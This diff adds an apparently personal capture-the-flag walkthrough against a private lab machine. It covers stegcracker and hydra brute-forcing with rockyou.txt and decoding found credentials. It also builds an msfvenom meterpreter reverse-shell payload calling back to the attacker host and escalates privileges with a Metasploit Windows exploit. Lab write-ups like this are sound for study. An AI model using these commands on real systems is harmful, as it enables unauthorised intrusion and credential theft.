@@ -1,0 +1,96 @@
+1) run ifconfig command to find my IP
+	10.0.2.6
+
+2) run nmap to scan and enumerate the target machine
+	10.0.2.0/24 Target is 10.0.2.12
+
+3) navigate to target ip in browser and save image of bridge
+
+4) use stegcracker to brute force
+	stegcracker pic1.jpg /usr/share/wordlists/rockyou.txt
+	returns password as “matthew”
+
+5) use password to unlock picture and gain access to thoughts.txt
+	steghide extract -sf pic1.jpg #Use password "matthew" from previous step
+	# Alternatively the password could be guessed by inspecting page source 
+
+6) reading thoughts.txt to gain a password encoded in ROT13.
+	Decode "plorefrpebpxf" to get “cybersecrocks”
+
+7)ftp into the machine and use gathered creds to login
+	ftp 10.0.2.12
+	matt
+	cybersecrocks
+
+8) get fptflag.txt
+	change to binary
+	get sensitiveinfo.pcap
+
+9) view ftpflag.txt to see flag
+	screenshot!!!
+
+10) open wireshark and load pcap file
+	follow the first tcp stream to reveal telnet credentials
+	username “hahaha”
+	password “haha”
+	
+	3rd tcp stream to reveal an SSH username “richmond”
+	instructions in stream point to using hydra to brute force password with the rockyou.txt wordlist
+
+11) login to telnet with the founds credentials and notice the bonus flag. View flag
+	type bonusflag.txt
+
+
+12)Brute force the SSH login with hydra to get the password
+	hydra -l richmond -P /usr/share/wordlists/rockyou.txt 10.0.2.12 ssh -t4
+	Password returned: “password” lol nice. 
+
+13) Login to ssh
+	
+	ssh richmond@10.0.2.12
+	Password: “password”
+
+
+14) navigate to /windows/Panther/unattend.xml
+	type unattend.xml (Best to delete this file with a script)
+	
+	Found base64 encoded password for IEUser: cXdlcnR5MTIzNDU=
+	Decoded it turn into: qwerty12345
+	Save for later?
+	PROBABLY TURNED OPUT TO GOOD TO BE TRUE. NO USE FOR THESE CREDDS. SSH DONT WORK.
+
+15) Continue looking around
+	type noteToRichmond.txt
+	Read instructions for belts
+
+16) Craft msfvenom stageless payload for 32bit system (x86)
+	msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.2.6 LPORT=4445 -f exe > shella2.exe
+
+17) configure metasploit multi/handler
+	Use multi handler
+	set lhost: 10.0.2.6
+	set lport:4445
+	run
+
+18) transfer payload via scp
+	scp shella2.exe richmond@10.0.2.12:
+	go back to SSH terminal. navigate to .exe and execute
+
+19) meterpreter shell gained
+	getuid -> IE9WIN7\richmond
+	Red Belt
+	background session
+
+20)Search msfconsole “exploit windows ntuser”
+	Start from the top and see what one works
+	use 0 exploit/windows/local/ntusermndragover
+	Use backgrounded session 
+	IT Worked first try!!
+	Navigate to users/IEUser/Desktop and get the flag.
+	
+
+alt1) exploit suggester
+
+alt2) Remmina connection
+
+
